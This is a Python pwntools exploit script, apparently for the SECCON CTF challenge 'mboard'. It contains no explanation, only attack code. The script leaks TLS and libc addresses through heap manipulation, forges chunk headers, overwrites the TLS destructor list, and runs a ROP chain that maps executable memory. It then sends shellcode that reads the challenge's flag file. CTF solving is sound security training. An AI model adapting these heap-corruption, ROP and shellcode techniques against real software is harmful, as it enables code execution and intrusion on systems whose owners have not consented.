#!/usr/bin/env python

from pwn import *

while True:
    try:
        HOST = 'localhost'
        HOST = 'mboard.pwn.seccon.jp'
        r = remote(HOST, 8273)

        def show():
            r.recvuntil('> ')
            r.sendline('1')

        def add(name, s, n=0, line=True):
            if n==0:
                n = len(s)
            r.recvuntil('> ')
            r.sendline('2')
            r.recvuntil('>> ')
            if line:
                r.sendline(name)
            else:
                r.send(name)
            r.recvuntil('>> ')
            r.sendline(str(n))
            r.recvuntil('>> ')
            r.send(s)

        def remove(n):
            r.recvuntil('> ')
            r.sendline('3')
            r.recvuntil('>> ')
            r.sendline(str(n))

        def modify(idx, s, n=0, is_pad=False):
            if n==0:
                n = len(s)
            r.recvuntil('> ')
            r.sendline('4')
            r.recvuntil('>> ')
            r.sendline(str(idx))
            r.recvuntil('>> ')
            if is_pad:
                r.send(str(0xd8).ljust(0xf0,'\x00')+p32(0xe9)*4)
            else:
                r.sendline(str(n))
            if is_pad:
                r.interactive()
            r.recvuntil('>> ')
            r.send(s)

        for i in range(2):
            add('a','b'*0x14)
        for i in range(2):
            remove(i)
        # leak TLS section address
        add('b'*16, 'xxxx', 0x21000, line=False)
        show()
        r.recvuntil('b'*16)
        s = r.recv(4)
        tls = u32(s) - 8
        print 'tls', hex(tls)
        remove(0)

        add('1111', 'pppp', 0x100)
        add('1111', 'qqqq', 0xae0)
        remove(0)
        add('1111', 'a', 0x100)
        show()
        r.recvuntil('1111')
        s = r.recvline()
        a = s.split('|')
        libc_base = u32(a[1][5:9]) - 0x1ab450
        print 'libc', hex(libc_base)

        add('6666', 'uuuu', 0x100)
        remove(0)
        add('2', 'f', 0xc0)
        add('2', 'x', 0x24)
        add('2', 'q22', 0x80)
        remove(1)
        # shrink the freed chunk
        modify(3, 'x'*0x24)
        add('4', 'dddd', 0x80)
        add('here', 'dddd', 0x40)
        remove(1)
        remove(2)

        fake = 'f'*0x80
        fake += p32(0x88) + p32(0x18)
        fake += 'mfsmfs'.ljust(16, '\x00')
        fake += '\x00'*16
        add('qq', fake, n=0x200)
        # register to make the list extend
        for i in range(11):
            add(str(i)*2, 'garbage', n=0x30)
        modify(5, 'lalala', 0x80)
        add(str(i)*2, 'garbage', n=0x30)

        fake = 'f'*0x80
        fake += p32(0x88) + p32(0x18)
        fake += 'mehmeh'.ljust(16, '\x00')
        fake += '\xe0'
        # partial write msg pointer to list
        modify(1, fake, n=0x200)
        tdor = tls + 0x22914
        buf_addr = tls - 0x2ff8
        set_context = libc_base + 0x40d61
        pop1 = libc_base + 0x0001750a
        pop3 = libc_base + 0x001417dd
        pop6 = libc_base + 0x000d9fa3
        read = libc_base + 0x000daf60
        mmap = libc_base + 0x000e7320

        rop = ''
        rop += p32(mmap) + p32(pop6) + p32(0x13370000) + p32(0x1000) + p32(7) + p32(34)
        rop += p32(0)*2
        rop += p32(read) + p32(pop3) + p32(0) + p32(0x13370100) + p32(0x200)
        rop += p32(0x13370100)

        # fake entry point to dtor_list
        modify(5, p32(1)+p32(tdor-0x10)+p32(0))

        # prepare ROP chain
        s = ''.ljust(0x30,'\x00')
        s += p32(buf_addr+0x50)
        s = s.ljust(0x4c, '\x00')
        s += p32(pop1) + p32(0)
        s += rop
        add('b', s, 0x24000)
        
        # realloc and set the dtor_list
        modify(0, p32(set_context) + p32(buf_addr))

        r.recvuntil('> ')
        r.sendline('0')

        # write path & open read write flag.txt & exit
        shellcode = 'eb3f59b804000000bb01000000ba11000000cd8089cb31c0b00531c9cd8089c3b00389e1b230cd80b004b301b230cd8031c040cd80b801000000bb00000000cd80e8bcffffff2f686f6d652f6d626f6172642f666c61672e74787400'
        shellcode = unhex(shellcode)
        r.send(shellcode)
        print 'flag:'
        r.recvuntil('/home/mboard/flag')
        r.interactive()
        exit()
    except EOFError as e:
        print "Failed"
    except KeyboardInterrupt as e:
        raise
    except:
        pass
    finally:
        r.close()

